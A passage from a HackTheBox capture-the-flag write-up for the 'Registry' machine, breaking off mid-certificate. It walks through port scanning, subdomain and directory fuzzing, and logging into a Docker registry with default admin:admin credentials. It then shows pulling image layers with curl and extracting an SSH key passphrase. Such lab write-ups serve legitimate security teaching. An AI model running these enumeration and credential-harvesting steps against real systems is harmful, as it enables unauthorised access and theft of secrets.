---
title: HTB: Registry
url: https://0xdf.gitlab.io/2020/04/04/htb-registry.html
date: 2020-04-04T14:45:00+00:00
difficulty: Hard [40]
os: Linux
tags: htb-registry, hackthebox, ctf, nmap, wfuzz, vhosts, gobuster, zcat, docker, bolt-cms, searchsploit, api, docker-fetch, ssh, credentials, sqlite, hashcat, webshell, firewall, tunnel, restic, cron
---

![Registry](https://0xdfimages.gitlab.io/img/registry-cover.png)

Registry provided the chance to play with a private Docker registry that wasn’t protected by anything other than a weak set of credentials. I’ll move past that to get the container and the SSH key and password inside. From there, I’ll exploit an instance of Bolt CMS to pivot to the www-data user. As www-data, I can access the Restic backup agent as root, and exploit that to get both the root flag and a root ssh key.

## Box Info

| Name | [Registry](https://hackthebox.com/machines/registry)  [Registry](https://hackthebox.com/machines/registry) [Play on HackTheBox](https://hackthebox.com/machines/registry) |
| --- | --- |
| Release Date | [19 Oct 2019](https://twitter.com/hackthebox_eu/status/1185104270909235200) |
| Retire Date | 04 Apr 2020 |
| OS | Linux Linux |
| Base Points | Hard [40] |
| Rated Difficulty | Rated difficulty for Registry |
| Radar Graph | Radar chart for Registry |
| First Blood User | 00:28:17[InfoSecJack InfoSecJack](https://app.hackthebox.com/users/52045) |
| First Blood Root | 01:26:09[jkr jkr](https://app.hackthebox.com/users/77141) |
| Creator | [thek thek](https://app.hackthebox.com/users/4615) |

## Recon

### nmap

`nmap` gives SSH on TCP/22, HTTP on TCP/80, and HTTPS on TCP/443:

```

root@kali# nmap -p- --min-rate 10000 -oA scans/nmap-alltcp 10.10.10.159
Starting Nmap 7.80 ( https://nmap.org ) at 2019-10-19 21:57 EDT
Nmap scan report for 10.10.10.159
Host is up (0.031s latency).
Not shown: 65532 closed ports
PORT    STATE SERVICE
22/tcp  open  ssh
80/tcp  open  http
443/tcp open  https

Nmap done: 1 IP address (1 host up) scanned in 9.16 seconds

root@kali# nmap -p 22,80,443 -sC -sV -oA scans/nmap-tcpscripts 10.10.10.159
Starting Nmap 7.80 ( https://nmap.org ) at 2019-10-19 22:11 EDT
Nmap scan report for 10.10.10.159
Host is up (0.032s latency).

PORT    STATE SERVICE  VERSION
22/tcp  open  ssh      OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 72:d4:8d:da:ff:9b:94:2a:ee:55:0c:04:30:71:88:93 (RSA)
|   256 c7:40:d0:0e:e4:97:4a:4f:f9:fb:b2:0b:33:99:48:6d (ECDSA)
|_  256 78:34:80:14:a1:3d:56:12:b4:0a:98:1f:e6:b4:e8:93 (ED25519)
80/tcp  open  http     nginx 1.14.0 (Ubuntu)
|_http-server-header: nginx/1.14.0 (Ubuntu)
|_http-title: Welcome to nginx!
443/tcp open  ssl/http nginx 1.14.0 (Ubuntu)
|_http-server-header: nginx/1.14.0 (Ubuntu)
|_http-title: Welcome to nginx!
| ssl-cert: Subject: commonName=docker.registry.htb
| Not valid before: 2019-05-06T21:14:35
|_Not valid after:  2029-05-03T21:14:35
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 15.48 seconds

```

Based on the [OpenSSH](https://packages.ubuntu.com/search?keywords=openssh-server) version, it looks like Ubuntu 18.04 Bionic.

### Domains

Based on the TLS certificate I see in `nmap` output, I’ll add registry.htb and docker.registry.htb to my hosts file. I’ll also run `wfuzz` to look for any other subdomains, but running on HTTP and HTTPS only gives `docker`:

```

root@kali# wfuzz -w /usr/share/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt -u http://10.10.10.159/ -H "Host: FUZZ.registry.htb" --hh 612
********************************************************
* Wfuzz 2.4 - The Web Fuzzer                           *
********************************************************

Target: http://10.10.10.159/
Total requests: 100000

===================================================================
ID           Response   Lines    Word     Chars       Payload
===================================================================

000002191:   200        0 L      0 W      0 Ch        "docker"                                                                                                                     

Total time: 501.4777
Processed Requests: 100000
Filtered Requests: 99999
Requests/sec.: 199.4106

```

### Website - TCP 80/443

#### Site

For both HTTP and HTTPS, it just returns the default NGINX page:

![1571537609461](https://0xdfimages.gitlab.io/img/1571537609461.png)

#### Web Brute Force

Running `gobuster` on both HTTP and HTTPS returned the same results:

```

root@kali# gobuster -k -u https://10.10.10.159 -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -x php -o scans/gobuster-80-root-small-php -t 40

=====================================================
Gobuster v2.0.1              OJ Reeves (@TheColonial)
=====================================================
[+] Mode         : dir
[+] Url/Domain   : https://10.10.10.159/
[+] Threads      : 40
[+] Wordlist     : /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt
[+] Status codes : 200,204,301,302,307,403
[+] Extensions   : php
[+] Timeout      : 10s
=====================================================
2019/10/19 22:35:01 Starting gobuster
=====================================================
/install (Status: 301)
/backup.php (Status: 200)
/bolt (Status: 301)
=====================================================
2019/10/19 23:00:26 Finished
=====================================================

```

#### /install

Visiting `/install` returns some kind of binary:

![1571537847576](https://0xdfimages.gitlab.io/img/1571537847576.png)

I’ll download it as a file, and the magic bytes suggest it is `gzip`:

```

root@kali# wget http://10.10.10.159/install/ -O install
--2019-10-19 22:18:23--  http://10.10.10.159/install/
Connecting to 10.10.10.159:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: unspecified [text/html]
Saving to: ‘install’

install                                                    [ <=>                                                                                                                         ]   1.03K  --.-KB/s    in 0s      

2019-10-19 22:18:23 (38.1 MB/s) - ‘install’ saved [1050]

root@kali# file install 
install: gzip compressed data, last modified: Mon Jul 29 23:38:20 2019, from Unix, original size modulo 2^32 167772200 gzip compressed data, reserved method, has CRC, was "", from FAT filesystem (MS-DOS, OS/2, NT), original size modulo 2^32 167772200

```

But it doesn’t decompress correctly. I can get data out of this using `zcat` (many linux commands have `z` versions that work off compressed data):

```

root@kali# zcat install.tar.gz 2>/dev/null | strings
ca.crt
0000775
0000041
0000041
00000002106
13464123607
012215
ustar  
www-data
www-data
-----BEGIN CERTIFICATE-----
MIIC/DCCAeSgAwIBAgIJAIFtFmFVTwEtMA0GCSqGSIb3DQEBCwUAMBMxETAPBgNV
BAMMCFJlZ2lzdHJ5MB4XDTE5MDUwNjIxMTQzNVoXDTI5MDUwMzIxMTQzNVowEzER
MA8GA1UEAwwIUmVnaXN0cnkwggEiMA0GCSqGSIb3DQEBAQUAA4IBDwAwggEKAoIB
AQCw9BmNspBdfyc4Mt+teUfAVhepjje0/JE0db9Iqmk1DpjjWfrACum1onvabI/5
T5ryXgWb9kS8C6gzslFfPhr7tTmpCilaLPAJzHTDhK+HQCMoAhDzKXikE2dSpsJ5
zZKaJbmtS6f3qLjjJzMPqyMdt/i4kn2rp0ZPd+58pIk8Ez8C8pB1tO7j3+QAe9wc
r6vx1PYvwOYW7eg7TEfQmmQt/orFs7o6uZ1MrnbEKbZ6+bsPXLDt46EvHmBDdUn1
zGTzI3Y2UMpO7RXEN06s6tH4ufpaxlppgOnR2hSvwSXrWyVh2DVG1ZZu+lLt4eHI
qFJvJr5k/xd0N+B+v2HrCOhfAgMBAAGjUzBRMB0GA1UdDgQWBBTpKeRSEzvTkuWX
8/wn9z3DPYAQ9zAfBgNVHSMEGDAWgBTpKeRSEzvTkuWX8/wn9z3DPYAQ9zAPBgNV
HRMBAf8EBTADAQH/MA0GCSqGSIb3DQEBCwUAA4IBAQABLgN9x0QNM+hgJIHvTEN3
LAoh4Dm2X5qYe/ZntCKW+ppBrXLmkOm16kjJx6wMIvUNOKqw2H5VsHpTjBSZfnEJ
UmuPHWhvCFzhGZJjKE+An1V4oAiBeQeEkE4I8nKJsfKJ0iFOzjZObBtY2xGkMz6N
7JVeEp9vdmuj7/PMkctD62mxkMAwnLiJejtba2+9xFKMOe/asRAjfQeLPsLNMdrr
CUxTiXEECxFPGnbzHdbtHaHqCirEB7wt+Zhh3wYFVcN83b7n7jzKy34DNkQdIxt9
QMPjq1S5SqXJqzop4OnthgWlwggSe/6z8ZTuDjdNIpx0tF77arh2rUOIXKIerx5B
-----END CERTIFICATE-----
readme.md
0000775
0000041
0000041
00000000201
13472260460
012667
ustar  
www-data
www-data
# Private Docker Registry
- https://docs.docker.com/registry/deploying/
- https://docs.docker.com/engine/security/certificates/

```

The bits at the end are interesting, and hint towards what I’m going to find at docker.registry.htb.

#### /bolt

There’s a pretty unconfigured instance of [Bolt CMS](https://bolt.cm/) at `/bolt`:

![1571582861303](https://0xdfimages.gitlab.io/img/1571582861303.png)

`searchsploit` does show several vulnerabilities in Bolt:

```

root@kali# searchsploit bolt
----------------------------------------------------------------------------- ----------------------------------------
 Exploit Title                                                               |  Path
                                                                             | (/usr/share/exploitdb/)
----------------------------------------------------------------------------- ----------------------------------------
Apple WebKit - 'JSC::SymbolTableEntry::isWatchable' Heap Buffer Overflow     | exploits/multiple/dos/41869.html
Bolt CMS 3.6.4 - Cross-Site Scripting                                        | exploits/php/webapps/46495.txt
Bolt CMS 3.6.6 - Cross-Site Request Forgery / Remote Code Execution          | exploits/php/webapps/46664.html
Bolt CMS < 3.6.2 - Cross-Site Scripting                                      | exploits/php/webapps/46014.txt
BoltWire 3.4.16 - 'index.php' Multiple Cross-Site Scripting Vulnerabilities  | exploits/php/webapps/36552.txt
Bolthole Filter 2.6.1 - Address Parsing Buffer Overflow                      | exploits/multiple/remote/24982.txt
CMS Bolt - Arbitrary File Upload (Metasploit)                                | exploits/php/remote/38196.rb
Cannonbolt Portfolio Manager 1.0 - Multiple Vulnerabilities                  | exploits/php/webapps/21132.txt
----------------------------------------------------------------------------- ----------------------------------------
Shellcodes: No Result

```

I took a look the at the [source for Bolt](https://github.com/bolt/bolt) on Github, and I see there’s a `changelog.md` file that indicates the current version is 3.6.10.

I grabbed that same file from Registry, and it shows 3.6.4:

```

root@kali# curl -s 10.10.10.159/bolt/changelog.md | head
Changelog for Bolt 3.x
======================

Bolt 3.6.4
----------

Released: 2019-01-24. Notable changes:
 - Fixed asset url generation for Bolt install in subfolder. [#7725](https://github.com/bolt/bolt/pull/7725)
 - Fixed: DBAL Sqlite schema diff bug, still needed on DBAL 2.9. [#7733](https://github.com/bolt/bolt/pull/7733)

```

There’s an XSS bug in 3.6.4, but that’s not too useful. There’s an RCE in 3.6.6, and often that could work on lesser versions, but I couldn’t get it to do anything, at least without creds. When looking at `46664.html`, I did see that it tries to log in at `/bolt` (which would be `/bolt/bolt` in this instance), and I find an admin login page there:

![1571583332077](https://0xdfimages.gitlab.io/img/1571583332077.png)

I was unable to guess the creds.

### docker.registry.htb

#### Site

This subdomain returns a 0 byte response at the root, as I saw above in my `wfuzz` output.

#### Web Brute Force

`gobuster` finds an additional path, `/v2`, which feels like an API based on the name:

```

root@kali# gobuster -u http://docker.registry.htb -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -o scans/gobuster-docker-80-root-small -t 40

=====================================================
Gobuster v2.0.1              OJ Reeves (@TheColonial)
=====================================================
[+] Mode         : dir
[+] Url/Domain   : http://docker.registry.htb/
[+] Threads      : 40
[+] Wordlist     : /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt
[+] Status codes : 200,204,301,302,307,403
[+] Timeout      : 10s
=====================================================
2019/10/20 10:59:45 Starting gobuster
=====================================================
/v2 (Status: 301)
/http%!A(MISSING)%!F(MISSING)%!F(MISSING)www (Status: 301)
/http%!A(MISSING)%!F(MISSING)%!F(MISSING)youtube (Status: 301)
/http%!A(MISSING)%!F(MISSING)%!F(MISSING)blogs (Status: 301)
/http%!A(MISSING)%!F(MISSING)%!F(MISSING)blog (Status: 301)
/**http%!A(MISSING)%!F(MISSING)%!F(MISSING)www (Status: 301)
=====================================================
2019/10/20 11:03:17 Finished
=====================================================

```

#### /v2

When I visit `/v2`, there’s a prompt for HTTP basic auth:

![1571585016770](https://0xdfimages.gitlab.io/img/1571585016770.png)

When I guess admin:admin, it lets me through, and the response is:

```

HTTP/1.1 200 OK
Server: nginx/1.14.0 (Ubuntu)
Date: Sun, 20 Oct 2019 15:24:34 GMT
Content-Type: application/json; charset=utf-8
Content-Length: 2
Connection: close
Docker-Distribution-Api-Version: registry/2.0
X-Content-Type-Options: nosniff
Strict-Transport-Security: max-age=63072000; includeSubdomains
X-Frame-Options: DENY
X-Content-Type-Options: nosniff

{}

```

## Shell as bolt

### Docker Registry - Background

At this point, given the box name, the subdomain, and my access to an API, I did a bit of reading about the [Docker Registry API](https://docs.docker.com/registry/spec/api/). Docker is a platform to run applications inside a container, which is like a virtual machine, but more lightweight. An image is the filesystem for a container. Once someone goes through the trouble to make a container, a registry is how images are managed and distributed. There’s a public Docker registry, but a individual or group can stand up a private registry as well.

notsosecure.com has a [nice introduction to pentesting Docker registry](https://www.notsosecure.com/anatomy-of-a-hack-docker-registry/), which I’ll follow for the next steps. My goal is to download a container from the registry and explore it.

### Option 1: Get Container FS Via API

#### Enumerate Registry

If this is, in fact, a Docker registry, I should be able to list the repos with the `/v2/_catalog` endpoint. I find one repository:

```

root@kali# curl -s -k --user "admin:admin" https://docker.registry.htb/v2/_catalog
{"repositories":["bolt-image"]}    

```

I can now visit `/v2/[repo name]/tags/list` to get a list of the tags for this repository:

```

root@kali# curl -s -k --user "admin:admin" https://docker.registry.htb/v2/bolt-image/tags/list
{"name":"bolt-image","tags":["latest"]}  

```

Next I’ll get the manifest file for the latest tag:

```

root@kali# curl -s -k --user "admin:admin" https://docker.registry.htb/v2/bolt-image/manifests/latest
{
   "schemaVersion": 1,
   "name": "bolt-image",
   "tag": "latest",
   "architecture": "amd64",
   "fsLayers": [
      {
         "blobSum": "sha256:302bfcb3f10c386a25a58913917257bd2fe772127e36645192fa35e4c6b3c66b"
      },
      {
         "blobSum": "sha256:3f12770883a63c833eab7652242d55a95aea6e2ecd09e21c29d7d7b354f3d4ee"
      },
      {
         "blobSum": "sha256:02666a14e1b55276ecb9812747cb1a95b78056f1d202b087d71096ca0b58c98c"  
      },
      {
         "blobSum": "sha256:c71b0b975ab8204bb66f2b659fa3d568f2d164a620159fc9f9f185d958c352a7"
      },
      {
         "blobSum": "sha256:2931a8b44e495489fdbe2bccd7232e99b182034206067a364553841a1f06f791"  
      },
      {
         "blobSum": "sha256:a3ed95caeb02ffe68cdd9fd84406680ae93d633cb16422d00e8a7c22955b46d4"
      },
      {
         "blobSum": "sha256:f5029279ec1223b70f2cbb2682ab360e1837a2ea59a8d7ff64b38e9eab5fb8c0"
      },
      {
         "blobSum": "sha256:d9af21273955749bb8250c7a883fcce21647b54f5a685d237bc6b920a2ebad1a"
      },
      {
         "blobSum": "sha256:8882c27f669ef315fc231f272965cd5ee8507c0f376855d6f9c012aae0224797"
      },
      {
         "blobSum": "sha256:f476d66f540886e2bb4d9c8cc8c0f8915bca7d387e536957796ea6c2f8e7dfff"
      }
   ],
   "history": [
      {
         "v1Compatibility": "{\"architecture\":\"amd64\",\"config\":{\"Hostname\":\"e2e880122289\",\"Domainname\":\"\",\"User\":\"\",\"AttachStdin\":true,\"AttachStdout\":true,\"AttachStder$
\":true,\"Tty\":true,\"OpenStdin\":true,\"StdinOnce\":true,\"Env\":[\"PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin\"],\"Cmd\":[\"bash\"],\"Image\":\"docker.registry.htb$
bolt-image\",\"Volumes\":null,\"WorkingDir\":\"\",\"Entrypoint\":null,\"OnBuild\":null,\"Labels\":{}},\"container\":\"e2e88012228993b25b697ee37a0aae0cb0ecef7b1536d2b8e488a6ec3f353f14\",\"co$
tainer_config\":{\"Hostname\":\"e2e880122289\",\"Domainname\":\"\",\"User\":\"\",\"AttachStdin\":true,\"AttachStdout\":true,\"AttachStderr\":true,\"Tty\":true,\"OpenStdin\":true,\"StdinOnce$
":true,\"Env\":[\"PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin\"],\"Cmd\":[\"bash\"],\"Image\":\"docker.registry.htb/bolt-image\",\"Volumes\":null,\"WorkingDir\":\"\",\$
Entrypoint\":null,\"OnBuild\":null,\"Labels\":{}},\"created\":\"2019-05-25T15:18:56.9530238Z\",\"docker_version\":\"18.09.2\",\"id\":\"f18c41121574af38e7d88d4f5d7ea9d064beaadd500d13d33e8c41$
d01aa5ed5\",\"os\":\"linux\",\"parent\":\"9380d9cebb5bc76f02081749a8e795faa5b5cb638bf5301a1854048ff6f8e67e\"}"
      },
      {
         "v1Compatibility": "{\"id\":\"9380d9cebb5bc76f02081749a8e795faa5b5cb638bf5301a1854048ff6f8e67e\",\"parent\":\"d931b2ca04fc8c77c7cbdce00f9a79b1954e3509af20561bbb8896916ddd1c34\",\"c$
eated\":\"2019-05-25T15:13:31.3975799Z\",\"container_config\":{\"Cmd\":[\"bash\"]}}"
      },
      {
         "v1Compatibility": "{\"id\":\"d931b2ca04fc8c77c7cbdce00f9a79b1954e3509af20561bbb8896916ddd1c34\",\"parent\":\"489e49942f587534c658da9060cbfc0cdb999865368926fab28ccc7a7575283a\",\"c$
eated\":\"2019-05-25T14:57:27.6745842Z\",\"container_config\":{\"Cmd\":[\"bash\"]}}"
      },
      {
         "v1Compatibility": "{\"id\":\"489e49942f587534c658da9060cbfc0cdb999865368926fab28ccc7a7575283a\",\"parent\":\"7f0ab92fdf7dd172ef58247894413e86cfc60564919912343c9b2e91cd788ae4\",\"c$
eated\":\"2019-05-25T14:47:52.6859489Z\",\"container_config\":{\"Cmd\":[\"bash\"]}}"
      },
      {
         "v1Compatibility": "{\"id\":\"489e49942f587534c658da9060cbfc0cdb999865368926fab28ccc7a7575283a\",\"parent\":\"7f0ab92fdf7dd172ef58247894413e86cfc60564919912343c9b2e91cd788ae4\",\"c$
eated\":\"2019-05-25T14:47:52.6859489Z\",\"container_config\":{\"Cmd\":[\"bash\"]}}"
      },
      {
         "v1Compatibility": "{\"id\":\"7f0ab92fdf7dd172ef58247894413e86cfc60564919912343c9b2e91cd788ae4\",\"parent\":\"5f7e711dba574b5edd0824a9628f3b91bfd20565a5630bbd70f358f0fc4ebe95\",\"cr
eated\":\"2019-05-24T22:51:14.8744838Z\",\"container_config\":{\"Cmd\":[\"/bin/bash\"]}}"
      },
      {
         "v1Compatibility": "{\"id\":\"5f7e711dba574b5edd0824a9628f3b91bfd20565a5630bbd70f358f0fc4ebe95\",\"parent\":\"f75463b468b510b7850cd69053a002a6f10126be3764b570c5f80a7e5044974c\",\"cr
eated\":\"2019-04-26T22:21:05.100534088Z\",\"container_config\":{\"Cmd\":[\"/bin/sh -c #(nop)  CMD [\\\"/bin/bash\\\"]\"]},\"throwaway\":true}"
      },
      {
         "v1Compatibility": "{\"id\":\"f75463b468b510b7850cd69053a002a6f10126be3764b570c5f80a7e5044974c\",\"parent\":\"4b937c36cc17955293cc01d8c7c050c525d22764fa781f39e51afbd17e3e5529\",\"cr
eated\":\"2019-04-26T22:21:04.936777709Z\",\"container_config\":{\"Cmd\":[\"/bin/sh -c mkdir -p /run/systemd \\u0026\\u0026 echo 'docker' \\u003e /run/systemd/container\"]}}"
      },
      {
         "v1Compatibility": "{\"id\":\"4b937c36cc17955293cc01d8c7c050c525d22764fa781f39e51afbd17e3e5529\",\"parent\":\"ab4357bfcbef1a7eaa70cfaa618a0b4188cccafa53f18c1adeaa7d77f5e57939\",\"cr
eated\":\"2019-04-26T22:21:04.220422684Z\",\"container_config\":{\"Cmd\":[\"/bin/sh -c rm -rf /var/lib/apt/lists/*\"]}}"
      },
      {
         "v1Compatibility": "{\"id\":\"ab4357bfcbef1a7eaa70cfaa618a0b4188cccafa53f18c1adeaa7d77f5e57939\",\"parent\":\"f4a833e38a779e09219325dfef9e5063c291a325cad7141bcdb4798ed68c675c\",\"cr
eated\":\"2019-04-26T22:21:03.471632173Z\",\"container_config\":{\"Cmd\":[\"/bin/sh -c set -xe \\t\\t\\u0026\\u0026 echo '#!/bin/sh' \\u003e /usr/sbin/policy-rc.d \\t\\u0026\\u0026 echo 'exi
t 101' \\u003e\\u003e /usr/sbin/policy-rc.d \\t\\u0026\\u0026 chmod +x /usr/sbin/policy-rc.d \\t\\t\\u0026\\u0026 dpkg-divert --local --rename --add /sbin/initctl \\t\\u0026\\u0026 cp -a /us
r/sbin/policy-rc.d /sbin/initctl \\t\\u0026\\u0026 sed -i 's/^exit.*/exit 0/' /sbin/initctl \\t\\t\\u0026\\u0026 echo 'force-unsafe-io' \\u003e /etc/dpkg/dpkg.cfg.d/docker-apt-speedup \\t\\t
\\u0026\\u0026 echo 'DPkg::Post-Invoke { \\\"rm -f /var/cache/apt/archives/*.deb /var/cache/apt/archives/partial/*.deb /var/cache/apt/*.bin || true\\\"; };' \\u003e /etc/apt/apt.conf.d/docke
r-clean \\t\\u0026\\u0026 echo 'APT::Update::Post-Invoke { \\\"rm -f /var/cache/apt/archives/*.deb /var/cache/apt/archives/partial/*.deb /var/cache/apt/*.bin || true\\\"; };' \\u003e\\u003e 
/etc/apt/apt.conf.d/docker-clean \\t\\u0026\\u0026 echo 'Dir::Cache::pkgcache \\\"\\\"; Dir::Cache::srcpkgcache \\\"\\\";' \\u003e\\u003e /etc/apt/apt.conf.d/docker-clean \\t\\t\\u0026\\u002
6 echo 'Acquire::Languages \\\"none\\\";' \\u003e /etc/apt/apt.conf.d/docker-no-languages \\t\\t\\u0026\\u0026 echo 'Acquire::GzipIndexes \\\"true\\\"; Acquire::CompressionTypes::Order:: \\\
"gz\\\";' \\u003e /etc/apt/apt.conf.d/docker-gzip-indexes \\t\\t\\u0026\\u0026 echo 'Apt::AutoRemove::SuggestsImportant \\\"false\\\";' \\u003e /etc/apt/apt.conf.d/docker-autoremove-suggests
\"]}}"
      },
   ],
   "signatures": [
      {
         "header": {
            "jwk": {
               "crv": "P-256",
               "kid": "AQVS:MD4Z:BDUI:RPO3:J4VJ:4NVN:E4Z3:UBX3:Q2RZ:XBHU:JQ27:QGLY",
               "kty": "EC",
               "x": "S9hMHmO_0gy2fUZurmUOt69ijynVWSkfOqt58q8HinQ",
               "y": "iSS41dQjbwudtggFuuGb9Hg2jkXJnxFeP5aS6ieulZg"
            },
            "alg": "ES256"
         },
         "signature": "unxMc9MSYzO0L5_XkMP-liKL7bUd_5S5QEtebgI-v19M96ST4ospCy7xXeUSlQec9Nd2wmh9SzNpKgelILhZGg",
         "protected": "eyJmb3JtYXRMZW5ndGgiOjY3OTIsImZvcm1hdFRhaWwiOiJDbjAiLCJ0aW1lIjoiMjAxOS0xMC0yMFQxNjoyNDoyOFoifQ"
      }
   ]

```

There’s a lot in there, but the most important thing is the list of blobs at the top. Each has a sha256 hash, and represents a commit to the image. I can download those using `/v2/[repo]/blobs/sha256:[hash]`. So I can get the first blob with:

```

root@kali# curl -s -k --user 'admin:admin' 'http://docker.registry.htb/v2/bolt-image/blobs/sha256:302bfcb3f10c386a25a58913917257bd2fe772127e36645192fa35e4c6b3c66b' > 302bfcb3f10c386a25a58913917257bd2fe772127e36645192fa35e4c6b3c66b.tar.gz
root@kali# file 302bfcb3f10c386a25a58913917257bd2fe772127e36645192fa35e4c6b3c66b.tar.gz 
302bfcb3f10c386a25a58913917257bd2fe772127e36645192fa35e4c6b3c66b.tar.gz: gzip compressed data, original size modulo 2^32 3584

```

I can decompress the blob, and it contains bits of the filesystem of the image:

```

root@kali# tar zxf 302bfcb3f10c386a25a58913917257bd2fe772127e36645192fa35e4c6b3c66b.tar.gz
root@kali# find etc/ -type f -ls
    17225      8 -rwxrwx---   1 root     vboxsf        222 May 24 18:25 etc/profile.d/01-ssh.sh
    17226      4 -rwxrwx---   1 root     vboxsf          0 May 25 11:17 etc/profile.d/.wh.02-ssh.sh

```

That SSH script at `etc/profile.d/01-ssh.sh` looks interesting:

```

#!/usr/bin/expect -f
#eval `ssh-agent -s`
spawn ssh-add /root/.ssh/id_rsa
expect "Enter passphrase for /root/.ssh/id_rsa:"
send "GkOcz221Ftb3ugog\n";
expect "Identity added: /root/.ssh/id_rsa (/root/.ssh/id_rsa)"
interactroot@kali# cat etc/profile.d/01-ssh.sh
#!/usr/bin/expect -f
#eval `ssh-agent -s`
spawn ssh-add /root/.ssh/id_rsa
expect "Enter passphrase for /root/.ssh/id_rsa:"
send "GkOcz221Ftb3ugog\n";
expect "Identity added: /root/.ssh/id_rsa (/root/.ssh/id_rsa)"
interact

```

Looks like I just found the passphrase for an ssh key.

#### Download All Blobs

I could download all the blobs one by one, but there’s a neat tool to do it for me, [docker\_fetch](https://github.com/NotSoSecure/docker_fetch/). I’ll run it, and it will get all the blobs:

```

root@kali# python /opt/docker_fetch/docker_image_fetch.py -u http://admin:admin@docker.registry.htb

[+] List of Repositories:                                

bolt-image                                               

Which repo would you like to download?:  bolt-image

[+] Available Tags:                                      

latest

Which tag would you like to download?:  latest           

Give a directory name:  blobs                            
Now sit back and relax. I will download all the blobs for you in blobs directory.
Open the directory, unzip all the files and explore like a Boss.

[+] Downloading Blob: 302bfcb3f10c386a25a58913917257bd2fe772127e36645192fa35e4c6b3c66b

[+] Downloading Blob: 3f12770883a63c833eab7652242d55a95aea6e2ecd09e21c29d7d7b354f3d4ee

[+] Downloading Blob: 02666a14e1b55276ecb9812747cb1a95b78056f1d202b087d71096ca0b58c98c

[+] Downloading Blob: c71b0b975ab8204bb66f2b659fa3d568f2d164a620159fc9f9f185d958c352a7

[+] Downloading Blob: 2931a8b44e495489fdbe2bccd7232e99b182034206067a364553841a1f06f791

[+] Downloading Blob: a3ed95caeb02ffe68cdd9fd84406680ae93d633cb16422d00e8a7c22955b46d4

[+] Downloading Blob: f5029279ec1223b70f2cbb2682ab360e1837a2ea59a8d7ff64b38e9eab5fb8c0

[+] Downloading Blob: d9af21273955749bb8250c7a883fcce21647b54f5a685d237bc6b920a2ebad1a

[+] Downloading Blob: 8882c27f669ef315fc231f272965cd5ee8507c0f376855d6f9c012aae0224797

[+] Downloading Blob: f476d66f540886e2bb4d9c8cc8c0f8915bca7d387e536957796ea6c2f8e7dfff  

```

Now I have a directory with the blobs:

```

root@kali# ls blobs/
02666a14e1b55276ecb9812747cb1a95b78056f1d202b087d71096ca0b58c98c.tar.gz  8882c27f669ef315fc231f272965cd5ee8507c0f376855d6f9c012aae0224797.tar.gz  f476d66f540886e2bb4d9c8cc8c0f8915bca7d387e536957796ea6c2f8e7dfff.tar.gz
2931a8b44e495489fdbe2bccd7232e99b182034206067a364553841a1f06f791.tar.gz  a3ed95caeb02ffe68cdd9fd84406680ae93d633cb16422d00e8a7c22955b46d4.tar.gz  f5029279ec1223b70f2cbb2682ab360e1837a2ea59a8d7ff64b38e9eab5fb8c0.tar.gz
302bfcb3f10c386a25a58913917257bd2fe772127e36645192fa35e4c6b3c66b.tar.gz  c71b0b975ab8204bb66f2b659fa3d568f2d164a620159fc9f9f185d958c352a7.tar.gz
3f12770883a63c833eab7652242d55a95aea6e2ecd09e21c29d7d7b354f3d4ee.tar.gz  d9af21273955749bb8250c7a883fcce21647b54f5a685d237bc6b920a2ebad1a.tar.gz

```

I can decompress them into a folder named `fs` with the following command:

```

root@kali# cat blobs/*.tar.gz  | tar -xzf - -C fs -i

```

`cat` will push the content of each blob into the pipe, which sends it in to `tar` with `-x` for extract, `-f` for file, `-z` for zlib compression, `-` for input file of `stdin`, `-C fs` to indicate the output directory, and `-i` to ignore end of file.

The result presents as a Linux file system:

```

root@kali# ls fs/
bin  boot  dev  etc  home  lib  lib64  media  mnt  opt  proc  root  run  sbin  srv  sys  tmp  usr  var

```

### Option 2: Download Container

Rather than pull down the blobs, I can just use Docker to pull and run the container.

#### Pull

First I need to get the container. When I try to pull it, I get an error:

```

root@kali# docker pull docker.registry.htb/bolt-image
Using default tag: latest
Error response from daemon: Get https://docker.registry.htb/v1/_ping: x509: certificate signed by unknown authority 

```

This is where I can use the certificate that was in the blob at `/install`. I’ll get the certificate out of that data with `zcat`:

```

root@kali# zcat install 2>/dev/null | strings -n 20
-----BEGIN CERTIFICATE-----
MIIC/DCCAeSgAwIBAgIJAIFtFmFVTwEtMA0GCSqGSIb3DQEBCwUAMBMxETAPBgNV
BAMMCFJlZ2lzdHJ5MB4XDTE5MDUwNjIxMTQzNVoXDTI5MDUwMzIxMTQzNVowEzER
MA8GA1UEAwwIUmVnaXN0cnkwggEiMA0GCSqGSIb3DQEBAQUAA4IBDwAwggEKAoIB
AQCw9BmNspBdfyc4Mt+teUfAVhepjje0/JE0db9Iqmk1DpjjWfrACum1onvabI/5
T5ryXgWb9kS8C6gzslFfPhr7tTmpCilaLPAJzHTDhK+HQCMoAhDzKXikE2dSpsJ5
zZKaJbmtS6f3qLjjJzMPqyMdt/i4kn2rp0ZPd+58pIk8Ez8C8pB1tO7j3+QAe9wc
r6vx1PYvwOYW7eg7TEfQmmQt/orFs7o6uZ1MrnbEKbZ6+bsPXLDt46EvHmBDdUn1
zGTzI3Y2UMpO7RXEN06s6tH4ufpaxlppgOnR2hSvwSXrWyVh2DVG1ZZu+lLt4eHI
qFJvJr5k/xd0N+B+v2HrCOhfAgMBAAGjUzBRMB0GA1UdDgQWBBTpKeRSEzvTkuWX
8/wn9z3DPYAQ9zAfBgNVHSMEGDAWgBTpKeRSEzvTkuWX8/wn9z3DPYAQ9zAPBgNV
HRMBAf8EBTADAQH/MA0GCSqGSIb3DQEBCwUAA4IBAQABLgN9x0QNM+hgJIHvTEN3
LAoh4Dm2X5qYe/ZntCKW+ppBrXLmkOm16kjJx6wMIvUNOKqw2H5VsHpTjBSZfnEJ
UmuPHWhvCFzhGZJjKE+An1V4oAiBeQeEkE4I8nKJsfKJ0iFOzjZObBtY2xGkMz6N
7JVeEp9vdmuj7/PMkctD62mxkMAwnLiJejtba2+9xFKMOe/asRAjfQeLPsLNMdrr
